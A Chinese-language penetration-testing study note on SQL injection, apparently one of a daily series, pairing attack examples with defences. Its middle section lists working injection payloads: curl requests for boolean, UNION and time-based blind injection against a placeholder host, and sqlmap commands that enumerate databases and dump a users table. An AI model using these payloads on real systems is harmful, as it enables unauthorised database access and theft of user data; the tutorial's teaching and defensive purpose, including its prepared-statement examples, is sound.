# 🔐 渗透测试知识 #002

**日期**: 2026-02-20  
**主题**: SQL 注入基础与防护  
**标签**: #渗透测试 #SQL 注入 #网络安全 #道德黑客

---

## ⚠️ 道德与法律声明

- **仅在对您拥有书面授权的系统上使用**
- 未经授权攻击数据库可能违反《网络安全法》第 27 条
- 学习请在自建实验环境（DVWA、SQLi-Labs、bWAPP）
- 发现漏洞及时报告，不利用不传播

---

## 🛠️ SQL 注入原理

SQL 注入发生在用户输入被直接拼接到 SQL 查询中时：

```sql
-- 脆弱代码示例（PHP）
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

---

## 🔍 检测与利用命令示例

### 1️⃣ 基础测试（判断是否存在注入）

```bash
# 在 URL 参数后添加单引号测试
curl "http://target.com/page?id=1'"

# 布尔盲注测试
curl "http://target.com/page?id=1' AND '1'='1"
curl "http://target.com/page?id=1' AND '1'='2"
```

### 2️⃣ UNION 注入（获取数据库信息）

```bash
# 确定列数（递增 ORDER BY）
curl "http://target.com/page?id=1 ORDER BY 3--"
curl "http://target.com/page?id=1 ORDER BY 4--"  # 报错则列数为 3

# 获取数据库名
curl "http://target.com/page?id=-1 UNION SELECT 1,database(),3--"

# 获取表名
curl "http://target.com/page?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

# 获取列名
curl "http://target.com/page?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
```

### 3️⃣ SQLMap 自动化测试（仅授权环境）

```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1" --batch

# 获取数据库列表
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取指定数据库的表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 获取指定表的数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# POST 请求注入
sqlmap -u "http://target.com/login" --data "username=admin&password=test" --batch
```

### 4️⃣ 时间盲注（无回显场景）

```bash
# MySQL 时间延迟测试
curl "http://target.com/page?id=1' AND SLEEP(5)--"

# PostgreSQL
curl "http://target.com/page?id=1' AND pg_sleep(5)--"

# SQL Server
curl "http://target.com/page?id=1'; WAITFOR DELAY '0:0:5'--"
```

---

## 🛡️ 防护方法

### 预编译语句（推荐）

```php
// PHP PDO 示例
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);
```

```python
# Python 示例
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

### 输入验证

```php
// 白名单验证
$allowed_ids = [1, 2, 3, 4, 5];
if (!in_array($id, $allowed_ids)) { die("Invalid ID"); }

// 类型强制转换
$id = (int)$_GET['id'];
```

### ORM 框架

```python
# Django ORM
User.objects.filter(username=username, password=password)

# SQLAlchemy
session.query(User).filter_by(username=username, password=password).first()
```

---

## 📖 学习资源

| 资源 | 链接 | 说明 |
|------|------|------|
| SQLi-Labs | GitHub | 本地 SQL 注入练习场 |
| DVWA | dvwa.co.uk | 含 SQL 注入模块的漏洞环境 |
| PortSwigger Academy | portswigger.net | 免费 Web 安全课程 |
| OWASP Top 10 | owasp.org | Web 应用安全风险标准 |
| HackTheBox | hackthebox.com | 实战渗透测试平台 |
| TryHackMe | tryhackme.com | 入门友好学习平台 |

---

## 💡 最佳实践

✓ **始终获取书面授权** - 明确测试范围和时间窗口  
✓ **使用实验环境** - VulnHub、DVWA、Docker 容器  
✓ **记录所有操作** - 时间戳、命令、结果  
✓ **遵守 scope** - 不越界、不测试未授权系统  
✓ **负责任披露** - 发现漏洞及时报告厂商  
✓ **持续学习** - 关注 CVE、安全公告、CTF 比赛  

---

## 🎯 明日预告

**XSS 跨站脚本攻击** - 反射型、存储型、DOM 型 XSS 原理与防护

---

*本内容仅供合法安全学习和授权渗透测试使用*
